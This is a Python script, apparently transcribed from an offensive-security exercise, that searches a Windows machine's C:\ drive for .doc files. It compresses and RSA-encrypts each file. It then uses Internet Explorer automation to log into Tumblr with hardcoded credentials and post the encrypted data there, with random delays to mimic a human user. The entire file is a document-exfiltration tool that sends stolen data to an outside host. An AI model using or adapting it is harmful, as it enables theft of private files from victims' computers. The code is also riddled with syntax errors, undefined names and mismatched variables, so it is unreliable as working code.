#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sun Oct 13 18:36:29 2019

@author: max
"""

import win32com.client
import os
import fnmatch
import time
import random
import zlib

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

doc_type = '.doc'
username = 'jm'
password = '123'

public_key = ''

def wait_for_browser(browser):
    
    # Espera o navegador terminar de carregar uma página
    while browser.ReadyState != 4 and browser.ReadyState != 'complete':
        time.sleep(0.1)
        
    return


def encrypt_string(plaintext):
    
    chunk_size = 256
    print ('Compressing: %d bytes'%len(plaintext))
    plaintext = zlib.compress(plaintext)
    
    print('Encrypting %d bytes'%len(plaintext))
    
    rsakey = RSA.importKey(public_key)
    rsakey = PKCS1_OAEP.new(rsakey)
    
    encrypted = ''
    offset = 0
    
    while offset < len(plaintext):
        
        chunk = plaintext[offset:offset+chunk_size]
        
        if le(chunk)% chunk_size != 0:
            chunk += ' ' * (chunk_size - len(chunk))
            
        encrypted += rsakey.encrypt(chunk)
        offset += chunk_size
        
    encrypted = encrypted.encode('base64')
    
    print('Base64 encoded crypto: %d'%len(encrypted))
    
    return encrypted


def encrypted_post(filename):
    
    # Abre e lê o arquivo
    fd = open(filename,'rb')
    contents = fd.read()
    fd.close()
    
    encrypted_title = encrypt_string(filename)
    encrypted_body = encrypt_string(contents) 
    
    return encrypted_title, encrypted_body


def random_sleep():
    time.sleep(random.randint(5, 10))
    

def login_to_tumblr(ie):
    
    # Obtém todos os elementos do documento
    full_doc = ie.Document.all
    
    # Faz uma iteração, procurando o formulário de login
    for i in full_doc:
        if i.id == 'signup_email':
            i.setAttribute('value',username)
        elif i.id == 'signup_password':
            i.setAttribute('value',password)
            
        random_sleep()
        
        # Diferentes páginer apresents iniciais poderão ser apresentada
    try:
            if ie.Document.forms[0].id == 'signup_form':
                ie.Document.forms[0].submit()
            
            else:
            ie.Document.forms[1].submit()
    except IndexError(e):
        pass
    
    random_browser(ie)
    
    return


def post_to_tumblr(ie,tle,postit):
    
    
    full_doc = ie.Document.all
    
    for i in full_doc:
        if i.id == 'post_one':
            i.setAttribute('value', title)
            title_box = i
            i.focus()
        elif i.id == 'post_two':
            i.setAttribute('innerHTML', post)
            print('Set text area')
            i.focus()
        elif i.id == 'create_post':
            print(Found post button)
            post_form = i
            i.focus()
            
    # Remove o foco da caixa principal de conteudo
    random_sleep()
    
    # Posta o formulário
    post_form.children[0].click()
    wait_for_browser(ie)
    
    random_sleep()
    
    return


def exfiltrate(document_path):
    
    ie = win32com.client.Dispatch('InternetExplorer.Application')
    ie.Visible = 1
    
    # Acessa o tumblr e faz login
    ie.Navigate('http://www.tumblr.com/login')
    wait_for_browser(ie)
    
    print('Logging in...')
    login_to_tumblr(ie)
    print('Logged in... navigatting')
    ie.Navigate('http://www.tumblr.com/new/text')
    wait_for_browser(ie)
    
    # Criptografa o arquivo
    title, body = encrypt_post(document_path)
    
    print('Creating new post...')
    post_to_tumblr(ie, title, body)
    print('Posted!')
    
    # Destroi a instancia do IE
    ie.Quit()
    ie = None
    
    return


# Laço principal da descoberta de documentos
for parent, directories, filenames in os.walk('C:\\'):
    for filename in fnmatch.filter(filenames, '*%s'%doc_type):
        document_path = os.path.join(parent, filename)
        print('Found: %s' % document_path)
        exfiltrate(document_path)
        input('Continue?')
        
        
        

